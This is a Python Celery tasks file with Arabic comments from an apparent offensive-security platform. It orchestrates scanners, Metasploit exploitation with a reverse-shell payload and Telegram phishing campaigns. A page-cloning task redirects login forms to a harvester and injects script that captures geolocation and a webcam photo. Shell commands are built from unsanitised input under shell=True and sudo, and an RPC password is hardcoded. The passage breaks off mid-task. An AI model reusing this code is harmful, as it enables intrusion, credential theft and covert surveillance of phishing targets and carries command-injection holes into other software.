# core/tasks.py
from json import tool
import re # <-- مكتبة جديدة لمعالجة النصوص
from network_mapper.models import NetworkDevice # <-- استيراد النموذج الجديد
import requests
import subprocess
import json
import os
from celery import shared_task
from django.utils import timezone
import requests
from django.conf import settings
from .models import Scan, Vulnerability, Alert, ActionLog, Playbook, Tool
import glob
import shutil # <-- مكتبة جديدة لحذف المجلدات
from pymetasploit3.msfrpc import MsfRpcClient # <-- استيراد المكتبة
import google.generativeai as genai
from django.conf import settings
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from .models import LandingPage
from django.core.mail import send_mail
from django.template import Template, Context
from .models import PhishingCampaign, PhishingResult
from django.utils import timezone
import pexpect # <-- استيراد المكتبة الجديدة
from .models import Scan, Tool, Vulnerability
from network_mapper.models import NetworkDevice
import hashlib
import xml.etree.ElementTree as ET
from cloud_scanner.models import AWSEnvironment, CloudScan, CloudFinding

@shared_task
def execute_scan_task(scan_id, target_for_tool): # <-- تم إضافة الوسيط الجديد
    """
    مهمة Celery عامة تقوم بتشغيل أي أداة فحص فردية.
    """
    try:
        scan = Scan.objects.get(id=scan_id)
        tool = scan.tool
    except (Scan.DoesNotExist, Tool.DoesNotExist):
        print(f"ERROR: Scan or Tool not found for scan_id {scan_id}.")
        return f"Scan or Tool not found for scan_id {scan_id}."

    scan.status = 'RUNNING'
    scan.save()
    
    output_path = f"/tmp/scan_report_{scan_id}"
    
    # بناء الأمر ديناميكيًا باستخدام الوسيط الجديد 'target_for_tool'
    executable = tool.executable_path or tool.name.lower()

    # بناء الأمر ديناميكيًا
    command_str = tool.command_template.format(
        executable=executable, # <-- متغير جديد
        target=target_for_tool,
        output=output_path,
        host_ip='127.0.0.1'
    )
    result_message = ""
    print(f"Executing command for scan {scan.id}: {command_str}")

    try:
        result = subprocess.run(
            command_str,
            shell=True,
            check=True,
            timeout=3600,
            capture_output=True,
            text=True
        )
        print(f"[{tool.name} Scan {scan.id}] STDOUT:\n{result.stdout}")
        print(f"[{tool.name} Scan {scan.id}] STDERR:\n{result.stderr}")

        # ✅==== إضافة جديدة للتشخيص ====✅
        if os.path.exists(output_path):
            with open(output_path, 'r') as f:
                file_content_for_debug = f.read()
                print(f"--- DEBUG: Content of {output_path} ---")
                print(file_content_for_debug)
                print("--- END DEBUG ---")
        else:
            print(f"--- DEBUG: Output file {output_path} was NOT created. ---")
        # ✅============================✅

        
        # منطق التحليل لجميع الأدوات
        if tool.name == 'Nikto':
            parse_nikto_json(scan, output_path)
        elif tool.name == 'Nmap':
            parse_nmap_text(scan, output_path)
        elif tool.name == 'dirsearch':
            parse_dirsearch_report(scan, output_path)
        elif tool.name == 'Nuclei':
            parse_nuclei_jsonl(scan, output_path)
        elif tool.name == 'SQLMap':
            parse_sqlmap_output(scan, output_path)
        elif tool.name == 'Subfinder':
            parse_subfinder_output(scan, output_path)
        elif tool.name == 'Amass':
            parse_amass_output(scan, output_path)
        elif tool.name == 'Trufflehog':
            parse_trufflehog_json(scan, output_path)
        elif tool.name == 'Subjack':
            parse_subjack_json(scan, output_path)
        elif tool.name == 'XXEinjector':
            parse_xxeinjector_output(scan, result)
        
        scan.status = 'COMPLETED'
        result_message = f"{tool.name} scan for {scan.target_url} completed successfully."

    except subprocess.CalledProcessError as e:
        scan.status = 'FAILED'
        result_message = f"{tool.name} process failed. Check worker logs for details."
        print(f"ERROR for scan {scan.id}: {tool.name} failed with exit code {e.returncode}")
        print(f"STDERR from tool:\n{e.stderr}")
    except subprocess.TimeoutExpired:
        scan.status = 'FAILED'
        result_message = "Scan timed out after 1 hour."
    except Exception as e:
        scan.status = 'FAILED'
        result_message = f"An unexpected error occurred: {str(e)}"
        print(f"UNEXPECTED ERROR for scan {scan.id}: {str(e)}")
    
    finally:
        scan.completed_at = timezone.now()
        scan.save()
        
        # منطق التنظيف النهائي
        if os.path.isdir(output_path):
            shutil.rmtree(output_path)
        elif os.path.exists(output_path):
            os.remove(output_path)
        
        # تنظيف ملف الطلب المؤقت الخاص بـ XXEinjector
        if tool.name == 'XXEinjector' and os.path.exists(target_for_tool):
            os.remove(target_for_tool)

    print(result_message)
    return result_message
# --- دوال مساعدة لتحليل مخرجات الأدوات ---

def parse_nikto_json(scan, file_path):
    """
    تحلل تقرير Nikto بصيغة JSON، مع معالجة التنسيقات المختلفة.
    """
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print(f"Nikto report file not found or is empty: {file_path}")
        return

    with open(file_path, 'r') as f:
        try:
            report_data = json.load(f)
        except json.JSONDecodeError:
            print(f"Error decoding JSON from Nikto report: {file_path}")
            # يمكنك هنا إضافة منطق لقراءة الملف كنص عادي وتسجيله
            return

    # --- منطق ذكي للتعامل مع التنسيقات المختلفة ---
    hosts = []
    if isinstance(report_data, dict):
        # التنسيق القياسي والناجح
        hosts = report_data.get('hosts', [])
    elif isinstance(report_data, list):
        # حالة خاصة قد تحدث عند وجود أخطاء
        # نفترض أن كل عنصر في القائمة هو تقرير مضمن
        hosts = report_data

    if not hosts:
        print(f"No 'hosts' found in Nikto report for scan {scan.id}")
        return
    # ----------------------------------------------
        
    for host_report in hosts:
        # التأكد من أن host_report هو قاموس قبل استخدام .get()
        if not isinstance(host_report, dict):
            continue

        for vuln in host_report.get('vulnerabilities', []):
            Vulnerability.objects.create(
                scan=scan, 
                description=vuln.get('description', 'No description provided.'), 
                severity=vuln.get('id', 'N/A'), 
                details=vuln
            )

def parse_nmap_text(scan, file_path):
    """
    تحلل تقرير Nmap النصي (-oN) باستخدام تعبير نمطي دقيق لتحديد البورتات المفتوحة فقط.
    """
    if not os.path.exists(file_path):
        print(f"Nmap report file not found: {file_path}")
        return

    # هذا التعبير النمطي يبحث عن الأسطر التي تبدأ برقم بورت، ثم /tcp، ثم كلمة "open" بالضبط
    # مثال: "22/tcp    open   ssh"
    port_pattern = re.compile(r"^\s*(\d+\/tcp)\s+(open)\s+(.*)$")

    with open(file_path, 'r') as f:
            for line in f:
                match = port_pattern.match(line.strip())
                if match:
                    port, state, service_str = match.groups()
                    
                    # ✅ إضافة جديدة: تحقق من وجود "tcpwrapped"
                    if "tcpwrapped" in service_str:
                        continue  # تجاهل هذا السطر وانتقل إلى التالي

                    Vulnerability.objects.create(
                        scan=scan,
                        description=f"Open Port: {port} - Service: {service_str.strip()}",
                        severity="Informational",
                        details={'port': port, 'service': service_str.strip(), 'raw_line': line.strip()}
                    )
# --- مهمة إثراء البيانات من VirusTotal ---

@shared_task
def enrich_ip_with_virustotal(alert_id, playbook_id):
    """
    Celery task لإغناء عنوان IP باستخدام VirusTotal API.
    """
    try:
        alert = Alert.objects.get(id=alert_id)
        playbook = Playbook.objects.get(id=playbook_id)
    except (Alert.DoesNotExist, Playbook.DoesNotExist):
        return f"Alert or Playbook not found."

    if not alert.source_ip:
        details = "Playbook failed: Alert has no source IP address."
        ActionLog.objects.create(alert=alert, playbook_run=playbook, details=details)
        return details

    ip_address = alert.source_ip
    api_key = settings.VIRUSTOTAL_API_KEY
    url = f"https://www.virustotal.com/api/v3/ip_addresses/{ip_address}"
    headers = {"x-apikey": api_key}
    details = ""

    try:
        response = requests.get(url, headers=headers, timeout=20)
        response.raise_for_status()
        data = response.json().get('data', {}).get('attributes', {})
        
        stats = data.get('last_analysis_stats', {})
        details = (
            f"VirusTotal analysis for {ip_address}:\n"
            f"- Malicious: {stats.get('malicious', 0)}, Suspicious: {stats.get('suspicious', 0)}\n"
            f"- Country: {data.get('country', 'N/A')}\n"
            f"- Owner: {data.get('as_owner', 'N/A')}"
        )
        ActionLog.objects.create(alert=alert, playbook_run=playbook, details=details)
        return f"Successfully enriched IP {ip_address}."

    except requests.RequestException as e:
        details = f"VirusTotal API request failed for IP {ip_address}. Error: {str(e)}"
        ActionLog.objects.create(alert=alert, playbook_run=playbook, details=details)
        return details


def parse_dirsearch_report(scan, file_path):
    """
    تحلل تقرير dirsearch بصيغة JSON، مع معالجة حالة الملف الفارغ.
    هذه هي الطريقة الأكثر موثوقية.
    """
    if not os.path.exists(file_path):
        print("Dirsearch report file does not exist.")
        return

    try:
        with open(file_path, 'r') as f:
            # اقرأ محتوى الملف أولاً
            content = f.read()
            
            # تحقق مما إذا كان المحتوى فارغًا أو يحتوي فقط على مسافات بيضاء
            if not content.strip():
                print("Dirsearch report file is empty. No results to parse.")
                return

            # الآن فقط حاول تحليل JSON
            report_data = json.loads(content)
            
            # dirsearch يكتب قاموس JSON يحتوي على مفتاح هو عنوان URL
            # نحن نهتم بالنتائج الموجودة تحت مفتاح الهدف
            target_url_keys = [k for k in report_data.keys() if k != 'errors']
            if not target_url_keys:
                print("No target URL key found in dirsearch JSON report.")
                return

            target_url = target_url_keys[0]
            results = report_data.get(target_url, [])

            for result in results:
                # نحن نهتم بالنتائج التي لها رمز استجابة صالح
                if result.get('status') not in [404, 400]:
                    Vulnerability.objects.create(
                        scan=scan,
                        description=f"Discovered Path: {result.get('path')}",
                        severity="Informational",
                        details=result  # نحفظ كائن النتيجة بالكامل
                    )
    except (json.JSONDecodeError, IndexError) as e:
        print(f"Error parsing dirsearch JSON report: {e}")
    except Exception as e:
        print(f"An unexpected error occurred in parse_dirsearch_report: {e}")

# --- إضافة جديدة: دالة تحليل لـ Nuclei ---
def parse_nuclei_jsonl(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        for line in f:
            try:
                data = json.loads(line)
                info = data.get('info', {})
                
                # --- هذا هو الجزء الذي تم تصحيحه ---
                cve_ids_raw = info.get('classification', {}).get('cve-id')
                cve_id_str = ""
                # نتأكد من أن cve_ids_raw هو قائمة قبل استخدام join
                if isinstance(cve_ids_raw, list):
                    cve_id_str = ", ".join(cve_ids_raw)
                # ------------------------------------

                Vulnerability.objects.create(
                    scan=scan,
                    description=info.get('name', 'No description provided.'),
                    severity=info.get('severity', 'unknown').capitalize(),
                    cve_id=cve_id_str, # نستخدم السلسلة النصية الآمنة
                    details=data
                )
            except json.JSONDecodeError:
                continue

# --- إضافة جديدة: دالة تحليل لـ SQLMap ---
def parse_sqlmap_output(scan, output_dir):
    """
    تحلل مخرجات sqlmap من مجلد النتائج.
    """
    # sqlmap ينشئ مجلدًا للهدف، وبداخله ملف 'log'
    # المسار سيكون شيئًا مثل: /tmp/scan_report_XX/testphp.vulnweb.com/log
    log_file_path = glob.glob(os.path.join(output_dir, '*', 'log'))

    if not log_file_path:
        print(f"SQLMap log file not found in {output_dir}")
        return

    with open(log_file_path[0], 'r') as f:
        content = f.read()
        # نبحث عن علامات تدل على وجود ثغرة
        if "Parameter:" in content and "Type:" in content and "Payload:" in content:
            # يمكننا جعل هذا التحليل أكثر ذكاءً لاستخراج تفاصيل الثغرة
            Vulnerability.objects.create(
                scan=scan,
                description="Potential SQL Injection vulnerability found.",
                severity="Critical",
                details={'log_content': content[:2000]} # حفظ أول 2000 حرف من السجل
            )


@shared_task
def run_metasploit_exploit(vuln_id):
    try:
        vuln = Vulnerability.objects.get(id=vuln_id)
    except Vulnerability.DoesNotExist:
        return f"Vulnerability {vuln_id} not found."

    # --- الاتصال بخدمة Metasploit ---
    try:
        client = MsfRpcClient('rax111rax', server='127.0.0.1', port=55553)
    except Exception as e:
        # لا يوجد سجل ActionLog هنا لأننا لا نملك كائن Alert
        print(f"Failed to connect to Metasploit RPC: {e}")
        return f"Failed to connect to Metasploit RPC: {e}"

    try:
        exploit = client.modules.use('exploit', vuln.metasploit_module)
        
        # تعيين الهدف
        exploit['RHOSTS'] = vuln.scan.target_url
        
        # يمكنك هنا تعيين خيارات أخرى إذا لزم الأمر، مثل RPORT
        
        # تنفيذ الاستغلال
        result = exploit.execute(payload='generic/shell_reverse_tcp')

        # التحقق من النتيجة
        if result and result.get('job_id') is not None:
            # يمكننا التحقق من قائمة الجلسات (sessions) لتأكيد النجاح
            sessions = client.sessions.list
            if sessions:
                details = f"Metasploit exploit successful! Session opened: {sessions}"
                print(details)
            else:
                details = "Metasploit exploit executed, but no session was created."
        else:
            details = "Metasploit exploit failed to execute."

        # ملاحظة: لا يوجد ActionLog هنا، يمكن إضافة سجل مخصص لاحقًا
        return details

    except Exception as e:
        return f"An error occurred during exploit execution: {str(e)}"
    
    
@shared_task
def analyze_vulnerability_with_ai(vuln_id):
    try:
        vuln = Vulnerability.objects.get(id=vuln_id)
    except Vulnerability.DoesNotExist:
        return f"Vulnerability {vuln_id} not found."

    # تكوين Gemini
    genai.configure(api_key=settings.GEMINI_API_KEY)
    model = genai.GenerativeModel('gemini-pro')

    # تحضير السؤال (Prompt)
    # سنعطي النموذج كل المعلومات التي لدينا عن الثغرة
    prompt = f"""
    You are an expert cybersecurity analyst. Analyze the following vulnerability finding and provide a concise, structured report in Markdown format.

    **Vulnerability Information:**
    - **Description:** {vuln.description}
    - **Severity:** {vuln.severity}
    - **Details (JSON):** {json.dumps(vuln.details, indent=2)}

    **Your report must include the following sections:**
    1.  **## What is this?** (A simple, clear explanation of the vulnerability).
    2.  **## What is the risk?** (Explain the potential impact, e.g., data theft, server takeover).
    3.  **## How to fix it?** (Provide clear, actionable steps for a system administrator to patch or mitigate this vulnerability).
    4.  **## How to exploit it?** (Briefly describe the general steps an attacker would take to exploit this, for educational purposes).
    """

    try:
        response = model.generate_content(prompt)
        analysis_text = response.text

        # حفظ التحليل في قاعدة البيانات
        vuln.ai_analysis = analysis_text
        vuln.save()
        
        return f"Successfully analyzed vulnerability #{vuln.id}."
    except Exception as e:
        error_message = f"Failed to get analysis from Gemini API: {str(e)}"
        # يمكنك حفظ رسالة الخطأ في حقل التحليل للتشخيص
        vuln.ai_analysis = error_message
        vuln.save()
        return error_message
    
    
def parse_subfinder_output(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        for line in f:
            subdomain = line.strip()
            if subdomain:
                Vulnerability.objects.create(
                    scan=scan,
                    description=f"Discovered Subdomain: {subdomain}",
                    severity="Informational", # اكتشاف النطاقات هو معلومة استطلاعية
                    details={'subdomain': subdomain}
                )

def parse_amass_output(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        for line in f:
            subdomain = line.strip()
            if subdomain:
                Vulnerability.objects.create(
                    scan=scan,
                    description=f"Discovered Asset: {subdomain}",
                    severity="Informational",
                    details={'asset': subdomain}
                )
                
def parse_ghauri_json(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        try:
            report_data = json.load(f)
            # Ghauri يضع النتائج داخل قائمة 'vulnerabilities'
            for vuln in report_data.get('vulnerabilities', []):
                # نجمع التفاصيل في وصف واحد
                description = f"Ghauri found SQLi. Parameter: {vuln.get('parameter')}, Type: {vuln.get('type')}"
                Vulnerability.objects.create(
                    scan=scan,
                    description=description,
                    severity="Critical",
                    details=vuln # نحفظ كل تفاصيل الثغرة
                )
        except json.JSONDecodeError:
            print(f"Error decoding JSON from Ghauri report: {file_path}")
            
def parse_trufflehog_json(scan, file_path):
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0: return
    with open(file_path, 'r') as f:
        try:
            # Trufflehog v3 يخرج JSON object لكل سر في سطر منفصل (JSONL)
            for line in f:
                if line.strip():
                    data = json.loads(line)
                    Vulnerability.objects.create(
                        scan=scan,
                        description=f"Leaked Secret Found: {data.get('DetectorName')}",
                        severity="Critical", # أي سر مكشوف هو حرج
                        details=data # نحفظ كل التفاصيل
                    )
        except json.JSONDecodeError:
            print(f"Error decoding JSON from Trufflehog report: {file_path}")

@shared_task
def run_recon_and_attack_playbook(scan_id):
    try:
        scan = Scan.objects.get(id=scan_id)
    except Scan.DoesNotExist:
        return "Scan not found."

    scan.status = 'RUNNING'
    scan.save()

    # --- المرحلة 1: تشغيل Subfinder ---
    subfinder_output_file = f"/tmp/subfinder_{scan.id}.txt"
    subfinder_tool = Tool.objects.get(name='Subfinder')
    subfinder_cmd = subfinder_tool.command_template.format(target=scan.target_url, output=subfinder_output_file)
    
    print(f"Playbook (Step 1): Running Subfinder: {subfinder_cmd}")
    try:
        subprocess.run(subfinder_cmd.split(), check=True, timeout=600)
    except Exception as e:
        scan.status = 'FAILED'
        scan.save()
        return f"Playbook failed at Subfinder step: {e}"

    if not os.path.exists(subfinder_output_file):
        scan.status = 'COMPLETED' # اكتمل ولكن لم يجد شيئًا
        scan.save()
        return "Subfinder found no subdomains."

    # --- المرحلة 2: تشغيل Nuclei ---
    nuclei_output_file = f"/tmp/nuclei_{scan.id}.jsonl"
    nuclei_tool = Tool.objects.get(name='Nuclei')
    # تعديل أمر Nuclei ليقرأ من ملف (-l) بدلاً من هدف واحد (-u)
    nuclei_cmd_str = nuclei_tool.command_template.replace('-u {target}', f'-l {subfinder_output_file}')
    nuclei_cmd_str = nuclei_cmd_str.format(target=scan.target_url, output=nuclei_output_file)
    
    print(f"Playbook (Step 2): Running Nuclei: {nuclei_cmd_str}")
    try:
        subprocess.run(nuclei_cmd_str.split(), check=True, timeout=3600)
    except Exception as e:
        scan.status = 'FAILED'
        scan.save()
        # تنظيف ملف subfinder
        os.remove(subfinder_output_file)
        return f"Playbook failed at Nuclei step: {e}"

    # --- المرحلة 3: تحليل نتائج Nuclei ---
    parse_nuclei_jsonl(scan, nuclei_output_file)
    
    scan.status = 'COMPLETED'
    scan.completed_at = timezone.now()
    scan.save()
    
    # تنظيف الملفات المؤقتة
    os.remove(subfinder_output_file)
    os.remove(nuclei_output_file)
    
    return f"Playbook 'Recon & Attack' completed for {scan.target_url}."


def parse_xxeinjector_output(scan, process_result): # <-- الآن نستقبل نتيجة العملية الكاملة
    # process_result هو الكائن الذي يرجعه subprocess.run
    # content هو المخرجات النصية من stdout
    content = process_result.stdout

    if content and ("VULNERABLE" in content or "file retrieved" in content or "Directory listing" in content):
        Vulnerability.objects.create(
            scan=scan,
            description="Potential XXE Injection vulnerability found by XXEinjector.",
            severity="High",
            details={'report_content': content}
        )
        
        
def parse_subjack_json(scan, file_path):
    """
    تحلل تقرير Subjack بصيغة JSONL وتنشئ سجلات للثغرات المكتشفة.
    """
    # التحقق من وجود الملف وأنه ليس فارغًا
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print(f"Subjack report file not found or is empty: {file_path}")
        return

    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue # تجاهل الأسطر الفارغة

            try:
                # كل سطر هو كائن JSON منفصل
                data = json.loads(line)

                # نحن نهتم فقط بالنتائج التي تم تأكيد أنها ضعيفة
                if data.get('status') == 'Vulnerable':
                    # تكوين وصف واضح للثغرة
                    description = (
                        f"Potential Subdomain Takeover on '{data.get('subdomain')}'."
                        f" Service identified: {data.get('service')}."
                    )
                    
                    Vulnerability.objects.create(
                        scan=scan,
                        description=description,
                        severity="High", # الاستيلاء على نطاق فرعي هو دائمًا خطير
                        details=data # نحفظ كل تفاصيل النتيجة كـ JSON
                    )
            
            except json.JSONDecodeError:
                print(f"Warning: Could not decode JSON line from Subjack report: {line}")
                continue # انتقل إلى السطر التالي في حالة وجود خطأ
            
            
@shared_task
def run_eyewitness_on_scan(scan_id):
    try:
        scan = Scan.objects.get(id=scan_id)
    except Scan.DoesNotExist:
        return "Scan not found."

    # 1. جمع الأهداف من نتائج الفحص الأصلي
    targets = [v.details.get('subdomain') or v.details.get('asset') for v in scan.vulnerabilities.all()]
    # إزالة أي قيم فارغة
    targets = [t for t in targets if t]

    if not targets:
        return "No subdomains or assets found in the original scan to run Eyewitness on."

    # 2. إنشاء ملف أهداف مؤقت
    target_file = f"/tmp/eyewitness_targets_{scan.id}.txt"
    with open(target_file, 'w') as f:
        for target in targets:
            f.write(f"http://{target}\n")
            f.write(f"https://{target}\n")

    # 3. إعداد مسارات Eyewitness
    # 👈 تعديل: جلب المسار من قاعدة البيانات
    eyewitness_tool = Tool.objects.get(name='Eyewitness') # Assuming you have a tool named 'Eyewitness'
    eyewitness_script_path = eyewitness_tool.executable_path
    if not eyewitness_script_path:
        return "Eyewitness executable path is not configured."

    output_dir_temp = f"/tmp/eyewitness_report_{scan.id}"
    
    command = [
        eyewitness_script_path,
        '-f', target_file,
        '-d', output_dir_temp,
        '--no-prompt'
    ]
    
    try:
        subprocess.run(command, check=True, timeout=1800)

        # 4. نقل التقرير إلى مجلد media
        final_report_dir = os.path.join(settings.MEDIA_ROOT, 'eyewitness_reports', str(scan.id))
        if os.path.exists(output_dir_temp):
            shutil.move(output_dir_temp, final_report_dir)
            
            # 5. حفظ مسار التقرير في قاعدة البيانات
            scan.eyewitness_report_path = os.path.join('eyewitness_reports', str(scan.id), 'report.html')
            scan.save()
            
            return f"Eyewitness report generated for scan {scan.id}."
    except Exception as e:
        return f"Eyewitness failed: {e}"
    finally:
        if os.path.exists(target_file):
            os.remove(target_file)
                


@shared_task
def launch_phishing_campaign(campaign_id):
    """
    مهمة Celery لإطلاق حملة تصيد: إرسال رسائل عبر تيليجرام (مع دعم الرسائل المخصصة).
    """
    try:
        campaign = PhishingCampaign.objects.get(id=campaign_id)
    except PhishingCampaign.DoesNotExist:
        return f"Campaign {campaign_id} not found."

    campaign.status = 'IN_PROGRESS'
    campaign.save()

    BASE_URL = "http://127.0.0.1:8000"
    
    sent_count = 0
    total_targets = campaign.targets.count()

    for target in campaign.targets.all():
        result, created = PhishingResult.objects.get_or_create(campaign=campaign, target=target)
        if result.is_sent:
            continue

        phishing_url = f"{BASE_URL}/track/click/{result.unique_id}/"

        message_sent = False
        # 1. محاولة الإرسال عبر تيليجرام أولاً إذا كان ID موجودًا
        if target.telegram_user_id:
            try:
                bot_token = settings.TELEGRAM_BOT_TOKEN
                chat_id = target.telegram_user_id
                
                # --- هذا هو المنطق الجديد لتخصيص الرسالة ---
                
                # جلب الرسالة المخصصة من قالب البريد
                telegram_template_str = campaign.email_template.telegram_message
                
                # إذا كان الحقل فارغًا، استخدم رسالة افتراضية
                if not telegram_template_str:
                    telegram_template_str = (
                        "Hello {{target_name}},\n\n"
                        "A security alert requires your attention. Please review the following document immediately:\n"
                        "{{phishing_link}}"
                    )

                # استخدام نظام قوالب Django لتخصيص الرسالة
                template = Template(telegram_template_str)
                context = Context({
                    'target_name': target.name or target.email,
                    'phishing_link': phishing_url
                })
                message_text = template.render(context)
                # ---------------------------------------------
                
                api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                payload = {'chat_id': chat_id, 'text': message_text}
                
                response = requests.post(api_url, data=payload, timeout=10)
                
                if response.json().get('ok'):
                    print(f"Successfully sent Telegram message to {target.email}")
                    message_sent = True
                else:
                    # طباعة الخطأ الفعلي من تيليجرام
                    print(f"Failed to send Telegram message to {target.email}: {response.json()}")
            
            except Exception as e:
                print(f"An unexpected error occurred while sending Telegram message: {e}")

        # 2. (مستقبلاً) يمكنك إضافة منطق إرسال البريد الإلكتروني هنا كخيار احتياطي
        # if not message_sent:
        #     # ...
        
        if message_sent:
            result.is_sent = True
            result.sent_date = timezone.now()
            result.save()
            sent_count += 1
    
    campaign.status = 'COMPLETED'
    campaign.save()
    
    return f"Campaign '{campaign.name}' completed. {sent_count} of {total_targets} messages sent."

@shared_task
def clone_landing_page(page_id, url_to_clone):
    """
    مهمة Celery لاستنساخ صفحة هبوط، تعديلها، وحقن سكربت التقاط الأدلة.
    """
    try:
        page = LandingPage.objects.get(id=page_id)
    except LandingPage.DoesNotExist:
        return f"LandingPage with id {page_id} not found."

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    }

    try:
        response = requests.get(url_to_clone, headers=headers, timeout=20)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')

        # --- المنطق الذكي لتعديل الصفحة ---

        # 1. تحويل كل الروابط (CSS, JS, images, etc.) إلى روابط مطلقة
        for tag in soup.find_all(['link', 'script', 'img', 'a', 'source']):
            for attr in ['href', 'src']:
                if tag.has_attr(attr) and tag[attr] and not tag[attr].startswith(('http', '//', '#', 'data:')):
                    # استخدام urljoin للتعامل مع المسارات المعقدة بشكل صحيح
                    tag[attr] = urljoin(url_to_clone, tag[attr])

        # 2. البحث عن نموذج تسجيل الدخول وتعديله
        form = soup.find('form')
        if form:
            harvester_url = "/phish/submit/" # الرابط الذي سيستقبل البيانات
            form['action'] = harvester_url
            form['method'] = 'post'

        # 3. إعداد وحقن سكربت التقاط الأدلة
        evidence_script_html = """
        <script>
            (async function() {
                // استخراج الـ UUID الفريد من مسار URL الحالي
                const pathParts = window.location.pathname.split('/');
                const resultId = pathParts[pathParts.length - 2];
                const evidenceUrl = `/phish/evidence/${resultId}/`;
                const evidencePayload = {};

                // 1. التقاط بيانات الجهاز (User Agent)
                evidencePayload.userAgent = navigator.userAgent;

                // 2. طلب الوصول إلى الموقع الجغراfi
                if ("geolocation" in navigator) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
                        });
                        evidencePayload.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                    } catch (err) {
                        evidencePayload.geolocation = { error: err.message };
                    }
                }

                // 3. طلب الوصول إلى الكاميرا والتقاط صورة
                if ("mediaDevices" in navigator && "getUserMedia" in navigator.mediaDevices) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.createElement('video');
                        video.setAttribute('playsinline', '');
                        video.srcObject = stream;
                        await video.play();

                        // انتظر قليلاً لضمان أن الكاميرا قد بدأت بالفعل
                        await new Promise(resolve => setTimeout(resolve, 500));

                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        evidencePayload.image_data = canvas.toDataURL('image/jpeg');
                        
                        // إيقاف بث الكاميرا فورًا بعد التقاط الصورة
                        stream.getTracks().forEach(track => track.stop());
                    } catch (err) {
                        evidencePayload.image_data = { error: err.message };
                    }
                }

                // 4. إرسال كل الأدلة التي تم جمعها إلى الخادم
                fetch(evidenceUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(evidencePayload)
                });
            })();
        </script>
        """
        
        # حقن السكربت قبل إغلاق وسم </body>
        if soup.body:
            soup.body.append(BeautifulSoup(evidence_script_html, 'html.parser'))

        # حفظ الـ HTML النهائي والمعدل في قاعدة البيانات
        page.html_content = str(soup)
        page.save()
        
        return f"Successfully cloned and instrumented page for '{page.name}'."

    except requests.RequestException as e:
        error_message = f"Failed to clone page: {e}"
        page.html_content = error_message
        page.save()
        return error_message
    
    

@shared_task
def run_network_discovery_task(ip_range, interface):
    print(f"Starting network discovery for range '{ip_range}' on interface '{interface}'...")
    
    command_str = f"sudo /usr/local/sbin/netdiscover -r {ip_range} -i {interface} -P -N"    
    output = ""
    try:
        result = subprocess.run(
            command_str, 
            shell=True,
            timeout=900, 
            capture_output=True, 
            # لا نستخدم text=True هنا، سنتعامل مع فك التشفير يدويًا
        )
        # نقوم بفك التشفير يدويًا مع معالجة الأخطاء
        stdout = result.stdout.decode('utf-8', errors='ignore') if result.stdout else ""
        stderr = result.stderr.decode('utf-8', errors='ignore') if result.stderr else ""
        output = stdout + stderr

    except subprocess.TimeoutExpired as e:
        # --- هذا هو التصحيح ---
        # نقوم بفك التشفير يدويًا لكل مخرج على حدة
        stdout = e.stdout.decode('utf-8', errors='ignore') if e.stdout else ""
        stderr = e.stderr.decode('utf-8', errors='ignore') if e.stderr else ""
        output = stdout + stderr
        print(f"Netdiscover timed out as expected. Output collected.")
        
    except Exception as e:
        print(f"Netdiscover failed to run unexpectedly: {e}")
        return f"Netdiscover failed: {e}"

    # --- باقي كود التحليل يبقى كما هو تمامًا ---
    device_pattern = re.compile(
        r"^\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+([0-9a-fA-F:]{17})\s+\d+\s+\d+\s+(.*)$"
    )
    
    discovered_count = 0
    updated_count = 0
    for line in output.splitlines():
        match = device_pattern.match(line.strip())
        if match:
            ip, mac, vendor = match.groups()
            device, created = NetworkDevice.objects.get_or_create(
                mac_address=mac.lower(),
                defaults={'ip_address': ip, 'vendor': vendor.strip()}
            )
            if not created:
                device.ip_address = ip
                device.vendor = vendor.strip()
                device.save()
                updated_count += 1
            else:
                discovered_count += 1
            
    total_found = discovered_count + updated_count
    return f"Network discovery completed. Found {discovered_count} new devices and updated {updated_count} existing ones. Total: {total_found}."


# --- إضافة جديدة: مهمة مخصصة لـ RouterSploit ---
@shared_task
def run_routersploit_audit(device_id):
    try:
        device = NetworkDevice.objects.get(id=device_id)
        tool = Tool.objects.get(name='RouterSploit')
    except (NetworkDevice.DoesNotExist, Tool.DoesNotExist):
        return f"Device or RouterSploit tool not found."

    # إنشاء سجل فحص جديد لهذه العملية
    scan = Scan.objects.create(
        tool=tool,
        target_url=device.ip_address,
        status='RUNNING'
    )


    log_file_path = f"/tmp/routersploit_log_{scan.id}.txt"
    log_file = open(log_file_path, "w")
    
    # 👈 تعديل: جلب المسار من قاعدة البيانات
    if not tool.executable_path:
        return "RouterSploit executable path is not configured in the admin panel."
    
    rsf_script = tool.executable_path
    
    try:
        # بدء عملية RouterSploit
# --- تعديل هنا: استخدم python3 بشكل صريح ---
        child = pexpect.spawn(f"python3 {rsf_script}", logfile=log_file, encoding='utf-8', timeout=900)
        # 1. انتظر موجه الأوامر الأولي
        child.expect(r'rsf >', timeout=600) # زيادة المهلة الأولية
        
        # 2. استخدم وحدة autopwn
